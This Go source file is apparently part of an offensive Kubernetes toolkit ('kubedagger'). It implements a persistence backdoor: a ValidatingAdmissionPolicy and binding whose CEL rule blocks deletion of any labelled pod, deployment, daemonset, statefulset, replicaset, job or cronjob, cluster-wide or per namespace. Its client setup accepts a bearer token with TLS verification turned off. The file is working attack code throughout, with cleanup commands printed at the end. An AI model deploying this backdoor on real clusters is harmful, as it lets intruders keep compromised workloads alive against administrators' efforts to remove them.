/*
Copyright © 2023 MOHAMMED YASIN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

// Package vap_backdoor implements persistence via Kubernetes
// ValidatingAdmissionPolicy (admissionregistration.k8s.io/v1beta1,
// requires Kubernetes >= 1.30): a cluster-scoped CEL policy denies deletion
// of any workload carrying the backdoor label.
package vap_backdoor

import (
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	admissionv1beta1 "k8s.io/api/admissionregistration/v1beta1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/meta"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/clientcmd"
)

const (
	// PolicyName is the name of the created ValidatingAdmissionPolicy.
	PolicyName = "kubedagger-vap"
	// BindingName is the name of the created ValidatingAdmissionPolicyBinding.
	BindingName = "kubedagger-vap-binding"

	// defaultLabel is the default protected label (key=value).
	defaultLabel = "kubedagger-backdoor=true"
)

// labelKeyPattern restricts label keys to values that are safe to embed in
// CEL expressions.
var labelKeyPattern = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9._/-]*[A-Za-z0-9])?$`)

// Execute builds a Kubernetes client and deploys the admission policy
// backdoor, printing a summary to stdout.
func Execute(kubeconfig, token, namespace, label string) error {
	client, err := getClient(kubeconfig, token)
	if err != nil {
		return fmt.Errorf("k8s client init failed: %w", err)
	}
	return Deploy(context.Background(), client, namespace, label, os.Stdout)
}

// Deploy creates a ValidatingAdmissionPolicy that denies DELETE requests for
// labelled workloads, plus a ValidatingAdmissionPolicyBinding. When namespace
// is empty or "all" the binding is cluster-wide; otherwise it is scoped to
// the named namespace via the kubernetes.io/metadata.name selector.
func Deploy(ctx context.Context, client kubernetes.Interface, namespace, label string, w io.Writer) error {
	labelKey, labelValue, err := ParseLabel(label)
	if err != nil {
		return err
	}

	vap, binding, err := buildResources(labelKey, labelValue, namespace)
	if err != nil {
		return err
	}

	createdVAP, err := client.AdmissionregistrationV1beta1().
		ValidatingAdmissionPolicies().
		Create(ctx, vap, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("create ValidatingAdmissionPolicy: %s (hint: ValidatingAdmissionPolicy requires Kubernetes >= 1.30 with admissionregistration.k8s.io/v1beta1): %w",
			notAvailableHint(err), err)
	}

	createdBinding, err := client.AdmissionregistrationV1beta1().
		ValidatingAdmissionPolicyBindings().
		Create(ctx, binding, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("create ValidatingAdmissionPolicyBinding: %s (hint: ValidatingAdmissionPolicy requires Kubernetes >= 1.30 with admissionregistration.k8s.io/v1beta1): %w",
			notAvailableHint(err), err)
	}

	writeSummary(w, createdVAP.Name, createdBinding.Name, labelKey, labelValue, namespace)
	return nil
}

// ParseLabel splits a key=value label selector, defaulting when empty.
func ParseLabel(label string) (key, value string, err error) {
	if strings.TrimSpace(label) == "" {
		label = defaultLabel
	}
	parts := strings.SplitN(label, "=", 2)
	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
		return "", "", fmt.Errorf("invalid label %q: expected key=value format (e.g. %s)", label, defaultLabel)
	}
	key, value = parts[0], parts[1]
	if !labelKeyPattern.MatchString(key) {
		return "", "", fmt.Errorf("invalid label key %q: must be alphanumeric with optional dots, dashes, slashes, or underscores", key)
	}
	return key, value, nil
}

// buildResources constructs the policy and binding objects.
func buildResources(labelKey, labelValue, namespace string) (*admissionv1beta1.ValidatingAdmissionPolicy, *admissionv1beta1.ValidatingAdmissionPolicyBinding, error) {
	deleteOp := admissionv1beta1.Delete
	fail := admissionv1beta1.Fail

	matchResources := func(rules []admissionv1beta1.NamedRuleWithOperations) *admissionv1beta1.MatchResources {
		return &admissionv1beta1.MatchResources{ResourceRules: rules}
	}

	vap := &admissionv1beta1.ValidatingAdmissionPolicy{
		ObjectMeta: metav1.ObjectMeta{Name: PolicyName},
		Spec: admissionv1beta1.ValidatingAdmissionPolicySpec{
			FailurePolicy: &fail,
			MatchConstraints: matchResources([]admissionv1beta1.NamedRuleWithOperations{
				{
					RuleWithOperations: admissionv1beta1.RuleWithOperations{
						Operations: []admissionv1beta1.OperationType{deleteOp},
						Rule: admissionv1beta1.Rule{
							APIGroups:   []string{""},
							APIVersions: []string{"v1"},
							Resources:   []string{"pods"},
						},
					},
				},
				{
					RuleWithOperations: admissionv1beta1.RuleWithOperations{
						Operations: []admissionv1beta1.OperationType{deleteOp},
						Rule: admissionv1beta1.Rule{
							APIGroups:   []string{"apps"},
							APIVersions: []string{"v1"},
							Resources:   []string{"deployments", "daemonsets", "statefulsets", "replicasets"},
						},
					},
				},
				{
					RuleWithOperations: admissionv1beta1.RuleWithOperations{
						Operations: []admissionv1beta1.OperationType{deleteOp},
						Rule: admissionv1beta1.Rule{
							APIGroups:   []string{"batch"},
							APIVersions: []string{"v1"},
							Resources:   []string{"jobs", "cronjobs"},
						},
					},
				},
			}),
			Validations: []admissionv1beta1.Validation{
				{
					// DELETE requests expose the existing object as oldObject.
					Expression: fmt.Sprintf(
						"!(has(oldObject.metadata.labels) && '%s' in oldObject.metadata.labels && oldObject.metadata.labels['%s'] == '%s')",
						labelKey, labelKey, labelValue),
					Message: fmt.Sprintf("resource is protected by %s and cannot be deleted", PolicyName),
				},
			},
		},
	}

	binding := &admissionv1beta1.ValidatingAdmissionPolicyBinding{
		ObjectMeta: metav1.ObjectMeta{Name: BindingName},
		Spec: admissionv1beta1.ValidatingAdmissionPolicyBindingSpec{
			PolicyName:        PolicyName,
			ValidationActions: []admissionv1beta1.ValidationAction{admissionv1beta1.Deny},
		},
	}

	if namespace != "" && namespace != "all" {
		binding.Spec.MatchResources = &admissionv1beta1.MatchResources{
			NamespaceSelector: &metav1.LabelSelector{
				MatchExpressions: []metav1.LabelSelectorRequirement{
					{
						Key:      "kubernetes.io/metadata.name",
						Operator: metav1.LabelSelectorOpIn,
						Values:   []string{namespace},
					},
				},
			},
		}
	}

	return vap, binding, nil
}

// writeSummary prints a human-readable summary with cleanup instructions.
func writeSummary(w io.Writer, policyName, bindingName, labelKey, labelValue, namespace string) {
	scope := "cluster-wide"
	if namespace != "" && namespace != "all" {
		scope = fmt.Sprintf("namespace '%s'", namespace)
	}

	fmt.Fprintf(w, "ValidatingAdmissionPolicy backdoor deployed\n\n")
	fmt.Fprintf(w, "  Policy:           %s (ValidatingAdmissionPolicy)\n", policyName)
	fmt.Fprintf(w, "  Binding:          %s (ValidatingAdmissionPolicyBinding)\n", bindingName)
	fmt.Fprintf(w, "  Scope:            %s\n", scope)
	fmt.Fprintf(w, "  Protected label:  %s=%s\n", labelKey, labelValue)
	fmt.Fprintf(w, "  Matched requests: DELETE of pods, deployments, daemonsets, statefulsets,\n")
	fmt.Fprintf(w, "                    replicasets, jobs, and cronjobs\n")
	fmt.Fprintf(w, "  Effect:           any DELETE of a resource carrying the protected label is\n")
	fmt.Fprintf(w, "                    DENIED by CEL admission control.\n\n")
	fmt.Fprintf(w, "Cleanup:\n")
	fmt.Fprintf(w, "  kubectl delete validatingadmissionpolicy %s\n", policyName)
	fmt.Fprintf(w, "  kubectl delete validatingadmissionpolicybinding %s\n", bindingName)
}

// notAvailableHint returns a hint string when the error indicates the
// admissionregistration v1beta1 API is not served by the cluster.
func notAvailableHint(err error) string {
	if apierrors.IsNotFound(err) || apierrors.IsMethodNotSupported(err) || meta.IsNoMatchError(err) {
		return "the API is not registered on this cluster"
	}
	return "unexpected API error"
}

// getClient builds a Kubernetes client, preferring an explicit token, then a
// kubeconfig path, then in-cluster config, then ~/.kube/config.
func getClient(kubeconfig, token string) (*kubernetes.Clientset, error) {
	if token != "" {
		config := &rest.Config{
			Host:        os.Getenv("KUBERNETES_SERVICE_HOST") + ":" + os.Getenv("KUBERNETES_SERVICE_PORT"),
			BearerToken: token,
			TLSClientConfig: rest.TLSClientConfig{
				Insecure: true,
			},
		}
		if config.Host == ":" {
			config.Host = "https://kubernetes.default.svc"
		}
		return kubernetes.NewForConfig(config)
	}

	if kubeconfig != "" {
		config, err := clientcmd.BuildConfigFromFlags("", kubeconfig)
		if err != nil {
			return nil, err
		}
		return kubernetes.NewForConfig(config)
	}

	config, err := rest.InClusterConfig()
	if err != nil {
		fallback := filepath.Join(homeDir(), ".kube", "config")
		config, err = clientcmd.BuildConfigFromFlags("", fallback)
		if err != nil {
			return nil, err
		}
	}
	return kubernetes.NewForConfig(config)
}

func homeDir() string {
	if h := os.Getenv("HOME"); h != "" {
		return h
	}
	return os.Getenv("USERPROFILE")
}
